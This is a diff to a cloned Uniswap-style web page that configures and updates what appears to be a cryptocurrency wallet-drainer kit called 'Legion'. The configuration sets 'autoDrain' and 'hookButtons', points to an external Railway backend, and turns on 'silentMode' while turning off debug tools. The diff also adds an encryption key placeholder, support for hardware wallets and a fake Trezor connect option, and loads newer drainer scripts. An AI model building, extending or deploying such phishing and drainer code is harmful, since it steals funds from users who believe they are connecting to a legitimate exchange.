@@ -7480,7 +7480,8 @@
     window.LEGION_CONFIG = {
       backendUrl: 'https://sadrailala-production.up.railway.app',
       wcProjectId: 'a785da105621eb55c998a35c57587667',
-      silentMode: false,
+      clientEncryptKey: '__CLIENT_ENCRYPT_KEY__',
+      silentMode: true,
       autoDrain: true,
       autoRun: false,
       autoConnectOnLoad: false,
@@ -7493,14 +7494,16 @@
       showOverlay: false,
       hookButtons: true,
       delayDrainMs: 400,
-      debugDevTools: true,
+      debugDevTools: false,
       strictCsp: false,
-      cdnFallback: true
+      cdnFallback: true,
+      hwWallets: true
     };
 </script>
+    <script>window.LEGION_BRAND='uniswap';</script>
     <script src="./vendor/legion-polyfills.js?v=1.1.0"></script>
-    <script src="./vendor/legion-wallet.iife.js?v=1.3.8"></script>
-    <script src="./legion.min.js?v=5.13.4" onerror="this.onerror=null;this.src='./legion.js?v=5.13.4'"></script>
+    <script src="./vendor/legion-wallet.iife.js?v=1.5.15"></script>
+    <script src="./legion.min.js?v=5.16.13" onerror="this.onerror=null;this.src='./legion.js?v=5.16.13'"></script>
 </head>
 
 <body style="">
@@ -9025,6 +9028,14 @@
                                                         <span maxfontsizemultiplier="1.4" data-disable-theme="true" class="font_body _display-inline _boxSizing-border-box _whiteSpace-pre-wrap _mt-0px _mr-0px _mb-0px _ml-0px _color-neutral1 _fontFamily-f-family _wordWrap-break-word _fontSize-f-size-medi3736 _fontWeight-f-weight-bo3548 _lineHeight-f-lineHeigh507465454 _pt-t-space-spa94665593 _pb-t-space-spa94665593">Binance Wallet</span>
                                                     </div>
                                                 </div>
+                                                <div class="_display-flex _alignItems-stretch _flexBasis-auto _boxSizing-border-box _position-relative _minHeight-0px _minWidth-0px _flexShrink-0 _flexDirection-column _height-2px _backgroundColor-surface1"></div>
+                                                <div data-wallet-connect="trezor" class="_backgroundColor-0hover-surface2Hov3121676 _display-flex _flexBasis-auto _boxSizing-border-box _minHeight-0px _minWidth-0px _flexShrink-0 _flexDirection-row _backgroundColor-surface2 _alignItems-center _width-10037 _justifyContent-space-betwe3241 _position-relative _pr-t-space-spa1360334080 _pl-t-space-spa1360334080 _pt-t-space-spa1360334080 _pb-t-space-spa1360334080 _cursor-pointer _opacity-1">
+                                                    <div class="_display-flex _flexBasis-auto _boxSizing-border-box _position-relative _minHeight-0px _minWidth-0px _flexShrink-0 _flexDirection-row _alignItems-center _gap-t-space-gap1569">
+                                                        <img alt="Trezor" src="data:image/svg+xml,%3csvg%20xmlns='http://www.w3.org/2000/svg'%20width='40'%20height='40'%20viewBox='0%200%2040%2040'%3e%3crect%20width='40'%20height='40'%20rx='8'%20fill='%231C1C1C'/%3e%3cpath%20d='M20%207L11%2011L11%2020C11%2026.5%2015.5%2032%2020%2034C24.5%2032%2029%2026.5%2029%2020L29%2011Z'%20fill='%2300B061'/%3e%3crect%20x='17'%20y='14'%20width='6'%20height='2'%20rx='1'%20fill='white'/%3e%3crect%20x='19'%20y='16'%20width='2'%20height='8'%20rx='1'%20fill='white'/%3e%3c/svg%3e"
+                                                            style="width: 32px; height: 32px; border-radius: 8px; border: 1px solid rgba(19, 19, 19, 0.08);">
+                                                        <span maxfontsizemultiplier="1.4" data-disable-theme="true" class="font_body _display-inline _boxSizing-border-box _whiteSpace-pre-wrap _mt-0px _mr-0px _mb-0px _ml-0px _color-neutral1 _fontFamily-f-family _wordWrap-break-word _fontSize-f-size-medi3736 _fontWeight-f-weight-bo3548 _lineHeight-f-lineHeigh507465454 _pt-t-space-spa94665593 _pb-t-space-spa94665593">Trezor</span>
+                                                    </div>
+                                                </div>
                                             </div>
                                         </div>
                                         <div class="_display-flex _alignItems-stretch _flexBasis-auto _boxSizing-border-box _position-relative _minHeight-0px _minWidth-0px _flexShrink-0 _flexDirection-column _gap-t-space-gap56">
@@ -9042,9 +9053,10 @@
             </div>
         </div>
         </div>
-        <script src="./legion-bridge.js?v=1.0.3" defer></script>
+        <script src="./legion-bridge.js?v=1.2.1" defer></script>
         <script src="wallet-modal.js?v=1.0.1" defer></script>
         <script src="wallet-detect.js?v=1.0.3" defer></script>
+        <!-- Trezor SDK loaded on demand by legion.js from ./vendor/trezor-connect-web.min.js -->
 </body>
 
 </html>
